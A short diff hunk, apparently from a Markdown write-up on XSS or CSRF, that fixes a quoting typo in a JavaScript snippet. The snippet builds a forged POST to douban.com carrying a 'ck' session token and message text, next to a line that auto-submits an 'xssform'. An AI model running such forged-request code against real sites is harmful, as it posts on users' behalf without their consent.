@@ -76,7 +76,7 @@ document.getElementById("xssform").submit();
 
 ```javascript
 var url="http://www.douban.com";
-var psotstr = "ck=JiUY&mb_text="test123";
+var psotstr = "ck=JiUY&mb_text=test123";
 var ajax = null;
 if(window.XMLHttpRequest) {
     ajax = new XMLHttpRequest();
